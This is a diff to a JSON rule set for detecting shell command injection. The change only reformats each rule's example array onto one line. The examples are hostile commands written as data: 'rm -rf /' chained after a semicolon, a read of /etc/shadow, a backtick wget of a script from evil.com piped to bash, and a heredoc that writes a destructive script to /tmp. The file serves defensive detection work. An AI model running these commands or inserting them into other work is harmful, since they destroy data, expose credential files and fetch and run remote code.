@@ -10,10 +10,7 @@
       "regex": "[^\"'`];\\s*\\w+",
       "severity": "critical",
       "false_positive_rate": 0.02,
-      "examples": [
-        "echo test; rm -rf /",
-        "ls; cat /etc/shadow"
-      ]
+      "examples": ["echo test; rm -rf /", "ls; cat /etc/shadow"]
     },
     {
       "id": "KI-002",
@@ -46,10 +43,7 @@
       "regex": "`[^`]+`",
       "severity": "critical",
       "false_positive_rate": 0.01,
-      "examples": [
-        "`wget -qO- evil.com/shell.sh` | bash",
-        "echo `id`"
-      ]
+      "examples": ["`wget -qO- evil.com/shell.sh` | bash", "echo `id`"]
     },
     {
       "id": "KI-005",
@@ -82,10 +76,7 @@
       "regex": "[\\uff1a]",
       "severity": "high",
       "false_positive_rate": 0.0,
-      "examples": [
-        "cmd \"任务：执行删除\"",
-        "echo \"结果：成功\""
-      ],
+      "examples": ["cmd \"任务：执行删除\"", "echo \"结果：成功\""],
       "notes": "Fullwidth colon may be normalized to ASCII colon by some shells, treat as potential injection vector"
     },
     {
@@ -122,9 +113,7 @@
       "regex": "<<\\s*\\w+",
       "severity": "medium",
       "false_positive_rate": 0.08,
-      "examples": [
-        "cat << EOF > /tmp/evil.sh\n#!/bin/bash\nrm -rf /\nEOF"
-      ]
+      "examples": ["cat << EOF > /tmp/evil.sh\n#!/bin/bash\nrm -rf /\nEOF"]
     }
   ],
   "metadata": {
